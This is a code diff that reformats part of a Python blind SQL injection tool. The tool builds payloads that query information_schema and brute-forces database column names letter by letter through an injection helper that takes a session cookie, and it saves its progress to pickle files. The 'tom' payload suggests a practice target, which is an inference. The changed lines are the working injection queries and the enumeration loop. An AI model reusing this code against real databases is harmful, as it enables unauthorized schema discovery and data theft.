@@ -29,8 +29,10 @@ def check_query(table_name, column_name):
     :param column_name: Name of the column
     :return: Query string
     """
-    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
-           f'and column_name= \'{column_name}\')--'
+    return (
+        f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' '
+        f'and column_name= \'{column_name}\')--'
+    )
 
 
 def builder_query(table_name, length, word):
@@ -42,8 +44,10 @@ def builder_query(table_name, length, word):
     :param word: Sequence of letters
     :return: Query string
     """
-    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
-           f'and substring(column_name,1,{length})=\'{word}\')--'
+    return (
+        f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' '
+        f'and substring(column_name,1,{length})=\'{word}\')--'
+    )
 
 
 def get_column_names(cookie):
@@ -77,7 +81,9 @@ def get_column_names(cookie):
             queue_word = queue.pop(0)
             for a in alphabets:
                 word = queue_word + a
-                query = builder_query(table_name=table_name, length=len(word), word=word)
+                query = builder_query(
+                    table_name=table_name, length=len(word), word=word
+                )
                 no_of_queries += 1
                 if inject.inject(cookie=cookie, query=query):
                     print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
@@ -85,7 +91,9 @@ def get_column_names(cookie):
                     queue.append(word)
 
             program_state_columns.append([queue, all_columns])
-            pickle.dump(program_state_columns, open('states/program_state_column.pkl', 'wb'))
+            pickle.dump(
+                program_state_columns, open('states/program_state_column.pkl', 'wb')
+            )
 
         for name in all_columns:
             query = check_query(table_name=table_name, column_name=name)
